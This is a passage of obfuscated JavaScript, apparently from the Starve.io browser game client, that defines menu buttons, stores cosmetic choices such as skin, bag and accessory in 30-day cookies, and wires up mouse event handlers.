			this.buttons[ᐃⲆ] = Δⵠⵠ(39, 122, "", [ⲆΔ.ᐃⲆⵠΔⲆΔᐃ, ⲆΔ.ⵠΔΔΔΔⲆⲆ, ⲆΔ.ΔⲆᐃΔⲆⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ΔΔΔⲆΔ, 260, 315, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃⵠⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(115, 73, "", [ⲆΔ.ⲆⵠᐃⲆᐃ, ⲆΔ.ᐃᐃⲆΔΔ, ⲆΔ.ᐃⵠⵠΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ⲆΔⵠⵠΔ)
			}), -320, 470, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃⵠⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(260, 260, "", [ⲆΔ.ΔᐃⲆⵠⵠⵠᐃ, ⲆΔ.ⲆᐃⵠΔΔΔⵠ, ⲆΔ.ⵠⵠΔΔΔⲆⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				if (ᐃᐃᐃ.ᐃΔΔⲆᐃ()) ΔᐃⲆΔⲆⲆⲆ(3, 50);
				else ⲆΔᐃⵠ(ᐃᐃΔᐃⵠ)
			}), -260 / 4, 197, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔᐃΔΔⲆⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(115, 73, "", [ⲆΔ.ⲆⵠᐃⲆᐃ, ⲆΔ.ᐃᐃⲆΔΔ, ⲆΔ.ᐃⵠⵠΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ΔᐃⵠⵠΔ)
			}), 309, 180, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔᐃΔΔⲆⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(260, 260, "", [ⲆΔ.ᐃᐃᐃⵠⵠᐃⲆ, ⲆΔ.ᐃⲆΔΔΔⲆⲆ, ⲆΔ.ⵠᐃᐃⵠᐃⲆⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃᐃᐃ.ᐃΔΔⲆᐃ() ? ΔᐃⲆΔⲆⲆⲆ(ΔⲆⵠⲆ, ΔᐃΔᐃΔ) : ⲆΔᐃⵠ(ᐃᐃΔᐃⵠ)
			}), -260 / 4, 150 + 448 / ΔⲆⲆⲆ - 65, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔᐃⲆᐃΔᐃⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(115, 73, "", [ⲆΔ.ⲆⵠᐃⲆᐃ, ⲆΔ.ᐃᐃⲆΔΔ, ⲆΔ.ᐃⵠⵠΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ΔᐃⵠⵠΔ)
			}), 309, 180, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔᐃⲆᐃΔᐃⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(260, 260, "", [ⲆΔ.ⵠⲆⵠΔⵠⲆⵠ, ⲆΔ.ᐃⲆΔⲆᐃᐃᐃ, ⲆΔ.ⲆᐃⲆΔᐃⵠΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃᐃᐃ.ᐃΔΔⲆᐃ() ? ΔᐃⲆΔⲆⲆⲆ(ⵠⲆⵠᐃ, 150) : ⲆΔᐃⵠ(ᐃᐃΔᐃⵠ)
			}), -260 / Ⲇⵠⵠⵠ, 150 + 448 / ⲆⵠΔⵠ - 260 / ΔⲆᐃⵠᐃ, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠΔΔⵠⵠⵠᐃ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(115, 73, "", [ⲆΔ.ⲆⵠᐃⲆᐃ, ⲆΔ.ᐃᐃⲆΔΔ, ⲆΔ.ᐃⵠⵠΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ΔᐃⵠⵠΔ)
			}), 309, 180, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠΔΔⵠⵠⵠᐃ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(260, 260, "", [ⲆΔ.ⲆⲆⲆᐃΔΔᐃ, ⲆΔ.ⵠⲆⲆΔⵠΔΔ, ⲆΔ.ᐃΔⲆΔⲆᐃⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃᐃᐃ.ᐃΔΔⲆᐃ() ? ΔᐃⲆΔⲆⲆⲆ(1, 300) : ⲆΔᐃⵠ(ᐃᐃΔᐃⵠ)
			}), -260 / 4, 150 + 448 / ᐃⲆᐃⲆⵠ - 65, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔⲆΔⲆᐃᐃᐃ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(115, 73, "", [ⲆΔ.ⲆⵠᐃⲆᐃ, ⲆΔ.ᐃᐃⲆΔΔ, ⲆΔ.ᐃⵠⵠΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ΔᐃⵠⵠΔ)
			}), 309, 180, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔⲆΔⲆᐃᐃᐃ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(260, 260, "", [ⲆΔ.ⵠᐃΔⵠΔⲆΔ, ⲆΔ.ⵠΔᐃᐃΔᐃΔ, ⲆΔ.ᐃⲆᐃᐃⲆΔΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃᐃᐃ.ᐃΔΔⲆᐃ() ? ΔᐃⲆΔⲆⲆⲆ(2, 600) : ⲆΔᐃⵠ(ᐃᐃΔᐃⵠ)
			}), -260 / 4, 150 + 448 / ⲆᐃᐃΔ - 65, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⵠⵠⲆΔΔΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(115, 73, "", [ⲆΔ.ⲆⵠᐃⲆᐃ, ⲆΔ.ᐃᐃⲆΔΔ, ⲆΔ.ᐃⵠⵠΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ΔᐃⵠⵠΔ)
			}), 309, 180, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⵠⵠⲆΔΔΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(260, 260, "", [ⲆΔ.ⲆⲆⲆᐃΔΔᐃ, ⲆΔ.ⵠⲆⲆΔⵠΔΔ, ⲆΔ.ᐃΔⲆΔⲆᐃⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				if (ᐃᐃᐃ.ᐃΔΔⲆᐃ()) ΔᐃⲆΔⲆⲆⲆ(5, 300);
				else ⲆΔᐃⵠ(ᐃᐃΔᐃⵠ)
			}), -260 / ⵠᐃᐃⲆ, 197, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠⵠⲆΔᐃ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(115, 73, "", [ⲆΔ.ⲆⵠᐃⲆᐃ, ⲆΔ.ᐃᐃⲆΔΔ, ⲆΔ.ᐃⵠⵠΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ΔᐃⵠⵠΔ)
			}), 309, 180, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠⵠⲆΔᐃ;
			var ΔⵠᐃⲆⵠᐃⵠⵠⵠ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(46, 51, "", [ⲆΔ.ⲆⵠᐃᐃⲆᐃᐃ, ⲆΔ.ⲆⲆⵠΔΔᐃΔ, ⲆΔ.ΔⵠᐃΔᐃᐃᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆⵠΔΔ(undefined, 0)
			}), -305, 132, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = Ⲇⵠᐃⵠᐃ;
			var ⲆⵠⵠⵠⵠΔⲆⵠΔ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(46, 51, "", [ⲆΔ.ⵠⵠⵠΔⲆᐃᐃ, ⲆΔ.ᐃᐃᐃΔΔⵠΔ, ⲆΔ.ⲆᐃᐃⵠᐃΔⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆⵠΔΔ(undefined, 1)
			}), -273, 132, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = Ⲇⵠᐃⵠᐃ;
			var ⵠⲆΔᐃΔⵠⵠᐃΔ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(46, 51, "", [ⲆΔ.ⲆΔᐃΔⲆⵠⲆ, ⲆΔ.ᐃᐃⵠᐃⲆΔᐃ, ⲆΔ.ΔᐃⵠⲆⲆⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆⵠΔΔ(ⲆⵠᐃⲆⲆ, ΔⲆΔΔΔ)
			}), -241, 132, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = Ⲇⵠᐃⵠᐃ;
			var ΔΔΔᐃⵠΔΔⲆⲆ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(46, 51, "", [ⲆΔ.ⵠⵠΔᐃᐃⵠΔ, ⲆΔ.ⵠⲆΔⵠⲆΔΔ, ⲆΔ.ⵠᐃⲆΔⵠΔΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆⵠΔΔ(undefined, 3)
			}), -305, 165, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = Ⲇⵠᐃⵠᐃ;
			var ᐃⲆΔᐃΔⵠᐃΔⵠ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(46, 51, "", [ⲆΔ.ᐃᐃᐃⵠᐃᐃⵠ, ⲆΔ.ⲆΔᐃⵠΔⲆⵠ, ⲆΔ.ᐃΔᐃⲆΔⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆⵠΔΔ(undefined, 4)
			}), -273, 165, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = Ⲇⵠᐃⵠᐃ;
			var ΔⲆΔΔᐃᐃΔΔⵠ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(46, 51, "", [ⲆΔ.ΔⲆΔΔⲆᐃⲆ, ⲆΔ.ΔⵠⲆΔⲆⲆⵠ, ⲆΔ.ΔⵠⵠⲆᐃᐃΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆⵠΔΔ(undefined, 5)
			}), -241, 165, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = Ⲇⵠᐃⵠᐃ;
			var ᐃᐃΔⲆΔⲆᐃᐃᐃ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(460, 73, "", [ⲆΔ.ᐃᐃᐃᐃΔⵠⲆ, ⲆΔ.ᐃⲆⵠᐃⵠⲆᐃ, ⲆΔ.ⵠᐃⲆᐃᐃΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆⵠΔΔ(-ⵠΔⲆ)
			}), -180, 170, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = Ⲇⵠᐃⵠᐃ;
			var ⲆⲆΔⵠⲆᐃⲆⵠⲆ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(222, 68, "", [ⲆΔ.ⵠΔΔΔⵠΔΔ, ⲆΔ.ⲆⲆᐃΔⲆΔⲆ, ⲆΔ.ⵠᐃΔᐃΔⵠᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆⵠΔΔ(ΔᐃᐃΔ.ⵠⵠⵠⵠⲆ)
			}), -180, 215, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = Ⲇⵠᐃⵠᐃ;
			var ⵠΔⲆᐃᐃΔⵠⵠᐃ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(222, 68, "", [ⲆΔ.ⵠⵠᐃⵠⲆⲆᐃ, ⲆΔ.ⲆᐃⵠΔⵠⵠⵠ, ⲆΔ.ΔΔⲆᐃΔᐃΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆⵠΔΔ(ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ)
			}), -180, 260, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = Ⲇⵠᐃⵠᐃ;
			var ᐃⲆᐃⲆⲆᐃΔΔⲆ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(222, 68, "", [ⲆΔ.ΔⵠΔΔⵠᐃᐃ, ⲆΔ.ⵠΔᐃᐃᐃⵠᐃ, ⲆΔ.ᐃⲆⵠⵠⲆᐃᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆⵠΔΔ(ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ)
			}), -60, 215, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = Ⲇⵠᐃⵠᐃ;
			var ⵠⲆⲆᐃⲆⵠⵠᐃΔ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(222, 68, "", [ⲆΔ.ΔᐃⵠⵠΔΔᐃ, ⲆΔ.ⵠᐃΔᐃⵠⲆΔ, ⲆΔ.ⲆᐃⵠΔΔⵠᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆⵠΔΔ(ΔᐃᐃΔ.ⲆⵠΔⵠᐃ)
			}), -60, 260, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = Ⲇⵠᐃⵠᐃ;
			this.ⵠΔᐃΔⲆᐃᐃ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(143, 66, "", [ⲆΔ.ⲆᐃΔⵠⵠⲆⵠ, ⲆΔ.ᐃⵠΔⲆⲆⵠᐃ, ⲆΔ.ⵠᐃⲆⵠⵠⵠΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(ΔΔΔⲆΔ, ⵠⲆᐃΔ.ⵠΔᐃΔⲆᐃᐃ)
			}), -298, 110, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ᐃⵠⵠⵠⵠΔΔ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(104, 66, "", [ⲆΔ.ⵠᐃⵠⵠⲆⵠᐃ, ⲆΔ.ᐃⲆⵠⲆΔΔⲆ, ⲆΔ.ⵠⵠΔⵠⲆⲆⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(undefined, ⵠⲆᐃΔ.ᐃⵠⵠⵠⵠΔΔ)
			}), -223, 110, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ᐃΔΔⵠΔᐃⲆ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(110, 66, "", [ⲆΔ.ᐃᐃⲆᐃΔᐃΔ, ⲆΔ.ΔΔΔᐃᐃΔⵠ, ⲆΔ.ⵠⲆⵠⵠᐃΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(undefined, ⵠⲆᐃΔ.ᐃΔΔⵠΔᐃⲆ)
			}), -168, 110, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ⵠΔⲆⲆᐃⲆᐃ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(88, 66, "", [ⲆΔ.ΔΔⵠⵠⵠⵠⲆ, ⲆΔ.ΔⲆΔΔᐃΔΔ, ⲆΔ.ΔⵠΔᐃᐃᐃᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(ᐃⵠᐃⵠᐃ, ⵠⲆᐃΔ.ⵠΔⲆⲆᐃⲆᐃ)
			}), -110, 110, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ᐃⵠΔᐃᐃᐃⵠ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(88, 66, "", [ⲆΔ.ΔⵠⵠᐃΔⵠⲆ, ⲆΔ.ⲆΔⵠⵠᐃⲆⲆ, ⲆΔ.ᐃⵠΔⲆⲆΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(ΔⵠⲆᐃΔ, ⵠⲆᐃΔ.ᐃⵠΔᐃᐃᐃⵠ)
			}), -63, 110, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(86, 44, "", [ⲆΔ.ⵠⵠᐃΔΔⵠᐃ, ⲆΔ.ΔⵠⲆⵠΔᐃΔ, ⲆΔ.ⲆⲆⵠⵠⲆᐃΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]("./terms.html", ⵠ[513])
			}), 349, 290, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔᐃⵠⵠΔ;
			var ⲆᐃⵠⲆⲆⵠΔⵠⲆ = new ΔⲆⵠⵠⵠᐃⲆ(ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ, ΔⵠⲆⵠⲆⲆⲆ, (function(ΔᐃΔ) {
				ⵠⲆᐃΔ.ⲆⵠⲆᐃ = ΔᐃΔ;
				if (ⵠⲆᐃΔ.unlock.ⲆⵠⲆᐃ[ΔᐃΔ] === ΔᐃⲆⵠ) ΔΔᐃᐃ.set("starve_skin", "" + ΔᐃΔ, {
					expires: 30
				})
			}), this.ⲆⵠⲆᐃ, this.unlock.ⲆⵠⲆᐃ);
			var ΔᐃΔᐃΔᐃᐃⲆᐃ = new ΔⲆⵠⵠⵠᐃⲆ(ᐃⲆⵠⲆ.ⵠᐃᐃⵠ, ΔⲆⲆⵠⲆⲆᐃᐃⲆ, (function(ΔᐃΔ) {
				ⵠⲆᐃΔ.ΔⵠΔᐃⲆ = ΔᐃΔ;
				if (ⵠⲆᐃΔ.unlock.ΔⵠΔᐃⲆ[ΔᐃΔ] === ΔⲆⵠ) ΔΔᐃᐃ.set("starve_bag", "" + ΔᐃΔ, {
					expires: 30
				})
			}), this.ΔⵠΔᐃⲆ, this.unlock.ΔⵠΔᐃⲆ);
			var ⲆⲆⲆⵠⲆᐃⲆⲆΔ = new ΔⲆⵠⵠⵠᐃⲆ(ᐃⲆⵠⲆ.ⵠⵠⲆⵠⲆ, ⵠᐃᐃΔⲆΔΔⵠⵠ, (function(ΔᐃΔ) {
				ⵠⲆᐃΔ.ⵠⲆᐃⵠⵠ = ΔᐃΔ;
				if (ⵠⲆᐃΔ.unlock.ⵠⲆᐃⵠⵠ[ΔᐃΔ] === 1) ΔΔᐃᐃ.set("starve_book", "" + ΔᐃΔ, {
					expires: 30
				})
			}), this.ⵠⲆᐃⵠⵠ, this.unlock.ⵠⲆᐃⵠⵠ);
			var ᐃⵠᐃᐃⲆⵠⲆΔᐃ = new ΔⲆⵠⵠⵠᐃⲆ(ᐃⲆⵠⲆ.ⲆᐃⲆΔᐃ, ⲆⵠⲆΔᐃΔΔⵠⵠ, (function(ΔᐃΔ) {
				ⵠⲆᐃΔ.ᐃⲆⵠΔⵠ = ΔᐃΔ;
				if (ⵠⲆᐃΔ.unlock.ᐃⲆⵠΔⵠ[ΔᐃΔ] === 1) ΔΔᐃᐃ.set("starve_dead", "" + ΔᐃΔ, {
					expires: 30
				})
			}), this.ᐃⲆⵠΔⵠ, this.unlock.ᐃⲆⵠΔⵠ);
			var ᐃᐃⲆⲆⵠᐃⲆΔⵠ = new ΔⲆⵠⵠⵠᐃⲆ(ᐃⲆⵠⲆ.ⲆᐃⲆΔᐃ, ⵠⵠⵠⲆⵠΔᐃΔΔ, (function(ΔᐃΔ) {
				ⵠⲆᐃΔ.ⲆᐃⲆⲆᐃ = ΔᐃΔ;
				if (ⵠⲆᐃΔ.unlock.ⲆᐃⲆⲆᐃ[ΔᐃΔ] === ΔᐃⲆⵠ) ΔΔᐃᐃ.set("starve_crate", "" + ΔᐃΔ, {
					expires: 30
				})
			}), this.ⲆᐃⲆⲆᐃ, this.unlock.ⲆᐃⲆⲆᐃ);
			var ⲆⵠⵠⵠΔⵠⲆΔΔ = new ΔⲆⵠⵠⵠᐃⲆ(ᐃⲆⵠⲆ.ⲆⲆᐃᐃᐃ, ⵠΔⵠΔⵠΔⵠⵠΔ, (function(ΔᐃΔ) {
				ⵠⲆᐃΔ.Δᐃᐃⵠᐃ = ΔᐃΔ;
				if (ⵠⲆᐃΔ.unlock.Δᐃᐃⵠᐃ[ΔᐃΔ] === ᐃⲆᐃ) ΔΔᐃᐃ.set("starve_accessory", "" + ΔᐃΔ, {
					expires: 30
				})
			}), this.Δᐃᐃⵠᐃ, this.unlock.Δᐃᐃⵠᐃ);
			this.ᐃΔΔᐃᐃⵠⲆ = function(ΔΔΔⲆ) {
				ⲆⲆⵠⵠ.ⵠΔΔᐃ = ᐃⵠΔⵠᐃΔⲆ(ᐃᐃᐃ.Ⲇⵠ, ΔΔΔⲆ);
				for (var ⵠᐃ = ⵠΔⲆⵠ; ⵠᐃ < ᐃᐃᐃ.buttons.length; ⵠᐃ++) {
					ᐃᐃᐃ.buttons[ⵠᐃ].info.active === ⵠⵠᐃΔ && ᐃᐃᐃ.buttons[ⵠᐃ].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ)
				}
			};
			this.ΔⵠⵠᐃᐃᐃΔ = function(ΔΔΔⲆ) {
				ⲆⲆⵠⵠ.ⵠΔΔᐃ = ᐃⵠΔⵠᐃΔⲆ(ᐃᐃᐃ.Ⲇⵠ, ΔΔΔⲆ);
				for (var ⵠᐃ = 0; ᐃᐃᐃ.buttons.length > ⵠᐃ; ⵠᐃ++) {
					var ⲆⲆᐃᐃ = ᐃᐃᐃ.buttons[ⵠᐃ];
					if (ⲆⲆᐃᐃ.info.active === ⵠⵠᐃΔ) {
						if (ⲆⲆᐃᐃ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ)) {
							ⲆⲆᐃᐃ.info.callback();
							return
						}
					}
				}
			};
			this.ΔᐃⵠⵠᐃⲆᐃ = false;
			this.ⲆⲆⵠᐃᐃⵠΔ = function(ΔΔΔⲆ) {
				ⲆⲆⵠⵠ.ⵠΔΔᐃ = ᐃⵠΔⵠᐃΔⲆ(ᐃᐃᐃ.Ⲇⵠ, ΔΔΔⲆ);
				var ΔⲆΔᐃⵠ = ΔⵠΔⲆΔ;
				for (var ⵠᐃ = 0; ᐃᐃᐃ.buttons.length > ⵠᐃ; ⵠᐃ++) {
					ⵠⵠᐃΔ === ᐃᐃᐃ.buttons[ⵠᐃ].info.active && (ΔⲆΔᐃⵠ |= ᐃᐃᐃ.buttons[ⵠᐃ].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ))
				}
				if (ᐃᐃᐃ.ΔᐃⵠⵠᐃⲆᐃ !== ΔⲆΔᐃⵠ) {
					ᐃᐃᐃ.ΔᐃⵠⵠᐃⲆᐃ = ΔⲆΔᐃⵠ;
					ΔⲆΔᐃⵠ ? Ⲇⵠ.style[ⵠ[333]] = ᐃᐃᐃ.ᐃΔΔΔⵠⲆΔ : Ⲇⵠ.style[ⵠ[333]] = ᐃᐃᐃ.ᐃⵠⲆᐃᐃΔⵠ
				}
			};
			this.ᐃⲆᐃⲆᐃⲆΔ = function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], this.ᐃΔΔᐃᐃⵠⲆ, false);
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ΔⵠⵠᐃᐃᐃΔ, false);
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[137], this.ⲆⲆⵠᐃᐃⵠΔ, false)
			};
			this.ⵠᐃΔⲆΔⵠⲆ = function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[133]](ⵠ[419], this.ᐃΔΔᐃᐃⵠⲆ, ⲆΔⲆᐃΔ);
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[133]](ⵠ[215], this.ΔⵠⵠᐃᐃᐃΔ, ⵠΔⲆⲆⲆ);
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[133]](ⵠ[137], this.ⲆⲆⵠᐃᐃⵠΔ, ⵠᐃⵠᐃᐃ)
			}
		}

		function ⵠΔⲆᐃⲆⲆⵠΔᐃ(ⵠⵠⵠⵠᐃⲆⵠ, ⵠⲆⵠⵠⲆⵠΔ) {
			const ⵠⲆⲆᐃᐃᐃᐃ = ((ⵠⵠⵠⵠᐃⲆⵠ + 17318) * 1664525 + 1013904223) % 4294967296;
			const ⵠⵠᐃⵠⵠⵠⲆ = (ⵠⲆⵠⵠⲆⵠΔ + 65271) % 65437;
			const ΔⵠΔⵠᐃΔⵠⵠᐃ = ΔⵠᐃᐃᐃΔⵠⵠⵠ(ⵠⲆⲆᐃᐃᐃᐃ, ⵠⵠᐃⵠⵠⵠⲆ, ⵠⲆⲆᐃᐃᐃᐃ);
			const ᐃᐃΔⲆᐃⵠΔⲆⵠ = ⵠⵠⲆⲆⵠⵠᐃ(ⵠⵠᐃⵠⵠⵠⲆ, ⵠⲆⲆᐃᐃᐃᐃ, ⵠⵠᐃⵠⵠⵠⲆ, ⵠⲆⲆᐃᐃᐃᐃ);
			const ᐃΔΔᐃΔᐃᐃⲆⵠ = ΔⵠΔⵠᐃΔⵠⵠᐃ ^ 27941;
			return ᐃΔΔᐃΔᐃᐃⲆⵠ
		}

		function ᐃⲆⲆⲆΔΔⲆⵠᐃ(ⲆⲆⵠⲆⲆⵠⵠ, ⵠΔΔΔᐃⵠᐃ, ΔΔⲆⲆΔΔΔ, ᐃⵠᐃⵠΔΔⵠ, ⲆᐃΔᐃⲆ, ᐃΔΔⲆΔⵠᐃ) {
			const ⲆᐃΔⵠⲆᐃΔ = ~(40116 & ⲆⲆⵠⲆⲆⵠⵠ) & (ⲆⲆⵠⲆⲆⵠⵠ | 40116);
			const ⲆΔΔⵠΔΔᐃ = (2531011 + 214013 * (54901 + ⵠΔΔΔᐃⵠᐃ)) % 4294967296;
